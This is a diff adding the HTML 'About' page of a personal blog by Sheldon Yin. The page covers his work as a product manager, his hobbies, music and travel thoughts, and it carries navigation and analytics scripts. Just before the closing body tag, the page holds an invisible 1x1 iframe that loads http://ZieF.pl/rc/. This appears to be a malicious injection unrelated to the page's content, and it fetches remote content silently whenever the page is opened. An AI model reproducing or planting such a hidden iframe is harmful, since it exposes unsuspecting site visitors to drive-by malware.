@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <title></title>
+
+    
+
+    <meta name="author" content="Sheldon Yin">
+
+    <!-- Enable responsive viewport -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" type="text/css" href="/assets/css/style.css">
+    <link rel="stylesheet" type="text/css" href="/assets/resources/syntax/syntax.css">
+    <link rel="stylesheet" type="text/css" href="/assets/resources/bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="/assets/resources/font-awesome/css/font-awesome.min.css">
+
+    <script type="text/javascript" src="http://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js"></script>
+    <script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.js"></script>
+    <script src="/assets/js/jquery.pagepiling.min.js"></script>
+
+    <script type="text/javascript">
+        $(document).ready(function () {
+            if (window.location.href == "http://www.sheldonyin.website/") {
+                $("#sidebar").css({width: '100%'});
+                $("#btnblog").click(function () {
+                    $("#sidebar").animate({width: '33.3333%'}, 'slow');
+                });
+            }
+        });
+
+    </script>
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?40772bc4ac75b32db18f92b73439a732";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+
+</head>
+<body>
+
+<nav class="navbar navbar-default visible-xs" role="navigation">
+
+
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbarHeaderCollapse">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+        </button>
+        
+        <a type="button" class="navbar-toggle nav-link" href="http://github.com/Sheldon-Yin">
+            <i class="fa fa-github"></i>
+        </a>
+        
+        
+        <a type="button" class="navbar-toggle nav-link" href="http://twitter.com/None">
+            <i class="fa fa-twitter"></i>
+        </a>
+        
+        
+        <a type="button" class="navbar-toggle nav-link" href="mailto:383541990@qq.com">
+            <i class="fa fa-envelope"></i>
+        </a>
+        
+
+
+        <a class="navbar-brand" href="http://127.0.0.1:4000/">
+            <img src="http://www.sheldonyin.website/sheldon.jpg" class="img-circle" style="height:35px;width:35px"/>
+            望蜀得陇的空间
+        </a>
+    </div>
+
+
+    <!-- Collect the nav links, forms, and other content for toggling -->
+    <div class="collapse navbar-collapse" id="navbarHeaderCollapse">
+        <ul class="nav navbar-nav">
+            <li class="active"><a href="http://127.0.0.1:4000/">Home</a>
+            </li>
+            <li><a href="http://127.0.0.1:4000//categories.html">Categories</a></li>
+            <li><a href="http://127.0.0.1:4000//tags.html">Tags</a></li>
+        </ul>
+    </div>
+    <!-- /.navbar-collapse -->
+
+</nav>
+
+<!-- nav-menu-dropdown -->
+<div class="btn-group hidden-xs" id="nav-menu">
+    <button type="button" class="btn btn-default dropdown-toggle pull-right" data-toggle="dropdown">
+        <i class="fa fa-bars"></i>
+    </button>
+    <ul class="dropdown-menu pull-right" role="menu">
+        <li><a href="http://127.0.0.1:4000/"><i
+                class="fa fa-home"></i> Home</a></li>
+        <li><a href="http://127.0.0.1:4000//categories.html"><i class="fa fa-folder"></i> Categories</a></li>
+        <li><a href="http://127.0.0.1:4000//tags.html"><i class="fa fa-tags"></i> Tags</a></li>
+        <li class="divider"></li>
+        <li><a href="#"><i class="fa fa-arrow-up"></i> Top of Page</a></li>
+    </ul>
+</div>
+
+<div class="col-sm-4 sidebar hidden-xs" id="sidebar">
+    <! -- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="http://127.0.0.1:4000/">
+		<img src="http://www.sheldonyin.website/sheldon.jpg" class="img-circle" style="border-radius: 50%;
+border: 3px solid #FFF; height:150px;width:150px" />
+	</a>
+	<h3 class="title">
+        <a href="http://127.0.0.1:4000/">望蜀得陇的空间</a>
+         <p style="font-size:20px;">安卓开发与前端开发爱好者</p>
+    </h3>
+    
+    <hr class="hr-line">
+<h3 class="title">
+         <p style="font-size:18px">Stay hungry, I am really hungry</p>
+    </h3>
+
+    <hr class="hr-line1">
+ <h3 class="title" style="font-size:30px;">
+ 
+       
+      <a type="button" class="social1" href="http://github.com/Sheldon-Yin">
+        <i class="fa fa-github"></i>
+      </a>
+      
+       
+      <a type="button" class="social2" href="http://twitter.com/None">
+        <i class="fa fa-twitter"></i>
+      </a>
+      
+     
+      
+      <a type="button" class="social3" href="mailto:383541990@qq.com">
+        <i class="fa fa-envelope"></i>
+      </a>
+      
+       <hr class="hr-line1">
+
+     <a type="button"  style="font-size:20px; padding:7px; padding-left:13px;padding-right:13px;margin-right: 10px;" class="social3 " id="btnabout" href="/about/">
+         <i class="fa" style="font-weight:bold;letter-spacing:0; font-family:arial,sans-serif">About</i>
+     </a>
+
+       <a type="button"  style="font-size:20px; padding:7px; padding-left:13px;padding-right:13px;margin-right: 10px;" class="social3 " id="btnblog" href="http://127.0.0.1:4000//#blog">
+        <i class="fa" style="font-weight:bold;letter-spacing:0; font-family:arial,sans-serif">Blog</i>
+      </a>
+      </h3>
+
+</header>
+
+
+
+<! -- sidebar.html end -->
+
+</div>
+
+<div class="col-sm-8 col-sm-offset-4" id="container">
+    <div class="about">
+  <a class="list_button" href="/">
+    <i class="fa fa-puzzle-piece"></i>
+  </a>
+  <div id="pagepiling">
+    <div class="section" id="section1">
+      <div class="info">
+  <a href="http://www.sheldonyin.website" target="_blank"><img src="http://www.sheldonyin.website/sheldon.jpg" class="img-circle" style="border-radius: 50%;
+border: 3px solid #FFF; height:150px;width:150px"></a>
+  <h2>Hello, I'm Sheldon Yin.</h2>
+  <p> 产品经理 </p>
+  <p> 不想当设计狮的程序猿不是好的产品经理 (๑•̀ㅂ•́)و✧</p>
+  <p>∞</p>
+  <p>日常爱好</p>
+  <p>动漫 &middot; 羽毛球 &middot; 睡觉 &middot; 玩游戏 &middot; 吃吃吃 &middot; 胖胖胖</p>
+  <p>∞</p>
+  <div class="list_icon">
+    <a href="mailto:383541990@qq.com"><i class="fa fa-envelope"></i></a>
+    <a href="https://github.com/Sheldon-Yin" target="_blank"><i class="fa fa-github-alt"></i></a>
+    <a href="https://instagram.com/sheldonyin/"  target="_blank"><i class="fa fa-instagram"></i></a>
+    <a href="http://weibo.com/sheldonyin" target="_blank"><i class="fa fa-weibo"></i></a>
+    <a href="http://www.zhihu.com/people/sheldonyin" target="_blank"><i>知</i></a>
+  </div>
+</div>
+    </div>
+    <div class="section" id="section2">
+      <div class="interest">
+  <div class="int-content">
+    <h2>&middot; 交个朋友吧 &middot;</h2>
+    <p>命运石之门/棋魂/<b>动漫</b>/灌篮高手/Angle Beats</p>
+    <p>周杰伦/陶喆/戴佩妮/五月天/<b>歌手</b>/Coldplay/Blunt James/陈奕迅</p>
+    <p>羽毛球/<b>Dota</b>/看动漫/写小说/<b>睡觉</b>/散步/炉石</p>
+    <p>不以<b>产品经理</b>为职业的话/当<b>写代码</b>或者<b>小说家</b>咯/<b>无业游民</b>也说不定</p>
+    <p>∞</p>
+    <p>To see the world things dangerous to come to<br>To see behind walls to draw closer<br>To find each other and to feel</p>
+    <p>That is the purpose of life</p>
+    <div class="int-link">
+      <span><a href="https://github.com/Sheldon-Yin/Sheldon-Yin.github.io" target="_blank"> [ 送 ★ 嘛 ] </a></span>
+      &nbsp;&middot;&nbsp;
+      <span><a href="http://www.sheldonyin.website/fragment/messages/" target="_blank"> [ 去留言 ] </a></span>
+      &nbsp;&middot;&nbsp;
+      <span><a href="javascript:">[ 打赏啦 ]</a></span>
+    </div>
+  </div>
+</div>
+
+
+    </div>
+    <div class="section" id="section3">
+      <div class="map">
+    <div class="map-content">
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=450
+                src="http://music.163.com/outchain/player?type=0&id=118896960&auto=1&height=430"></iframe>
+    </div>
+    <div class="map-container">
+        <div class="map-text one">
+            <h2>我从未想着要去什么地方！</h2>
+
+            <p>沙漠，大海，高山，小镇</p>
+
+            <p>可是中国那么大，对我来说好像都一样</p>
+
+            <p>没有任何出行的准备，可是心却四处乱荡</p>
+
+            <p>∞</p>
+        </div>
+        <div class="map-text two">
+            <h2>想象着任何可能有人在的地方!</h2>
+
+            <p>西藏 &middot; 云南 &middot; 港澳台 &middot; 泰国 &middot; 厦门</p>
+
+            <p>新西兰 &middot; 欧洲列国 &middot; 亚马逊原始森林 &middot; 日韩</p>
+
+            <p>∞</p>
+
+            <h2>想象各种各样的生活?</h2>
+
+            <p>其实我想，在哪，应该都一样，在原地，也一直都不一样</p>
+        </div>
+    </div>
+</div>
+    </div>
+  </div>
+</div>
+
+<link rel="stylesheet" href="/assets/css/jquery.pagepiling.css">
+<link rel="stylesheet" href="/assets/css/index.min.css">
+<script src="/assets/js/index.min.js"></script>
+<script>
+$(function() {
+    //分页设置
+    $('#pagepiling').pagepiling({
+        menu: '#menu',
+        anchors: ['info', 'hey', 'travel'],
+        sectionsColor: [],
+        navigation: {
+            'textColor': '#f2f2f2',
+            'bulletsColor': '#CE2323',
+            'position': 'right'
+        },
+
+        afterRender: function(){
+            $('#pp-nav').addClass('custom');
+        },
+        afterLoad: function(anchorLink, index){
+            if (index > 1) {
+                $('#pp-nav').removeClass('custom');
+            } else {
+                $('#pp-nav').addClass('custom');
+            }
+        }
+    });
+});
+</script>
+
+
+    <footer class="navbar navbar-default">
+        <div class="container">
+            <p class="navbar-text pull-left">Some rights reserved &copy; 2016 Sheldon Yin. </br>
+                Created using <a class="navbar-button" href="https://github.com/twbs/bootstrap">Bootstrap3</a> and <a
+                        class="navbar-button" href="https://github.com/jekyll/jekyll">Jekyll</a>. Theme : <a
+                        class="navbar-button"
+                        href="https://github.com/Sheldon-Yin/Shledon-Yin.github.io">Sheldon-Yin</a></p>
+        </div>
+    </footer>
+</div>
+<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
